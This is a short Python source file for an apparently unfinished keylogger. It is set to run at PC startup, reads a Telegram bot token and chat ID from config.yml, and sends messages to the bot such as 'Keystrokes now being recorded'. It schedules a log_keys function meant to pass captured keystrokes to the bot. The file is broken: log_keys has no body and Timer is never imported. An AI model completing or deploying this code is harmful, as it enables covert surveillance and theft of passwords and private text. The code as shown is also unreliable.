import yaml
import requests
import logging
from logger import Logger
import keyboard


class Bot:
	def __init__(self):
		self.__TOKEN = self.__read_token()
		self.__CHAT_ID = self.__read_chat_id()



	def __read_token(self):
		with open("config.yml") as f:
			try:
				contents = yaml.safe_load(f)
				return contents["BOT_TOKEN"]
			except yaml.YAMLError as e:
				print(e)

	def __read_chat_id(self):
		with open("config.yml") as f:
			try:
				contents = yaml.safe_load(f)
				return contents["CHAT_ID"]
			except yaml.YAMLError as e:
				print(e)

	def send_message(self,message):
		url = f"https://api.telegram.org/bot{self.__TOKEN}/sendMessage?chat_id={self.__CHAT_ID}&text={message}"
		
		response = requests.get(url)
		#print(response.json())
		
		if response.status_code != 200:
			print(f"**A {response.status_code} ERROR OCCURED**: {response.text}")

def log_keys(bot):
	


def main():
	# on start of the script (aka on pc startup)
	
	# initialized everything
	bot = Bot()
	logger = Logger("events.log")

	#logs start message
	bot.send_message("PC has been turned on and logged in successfully.")
	logger.info("pc on")

	
	# starts the logger/keystroke recorder
	bot.send_message("Keystrokes now being recorded")
	logger.info("ks on")
	t = Timer(5.0, log_keys, args=bot)
	t.start()
	

	pass
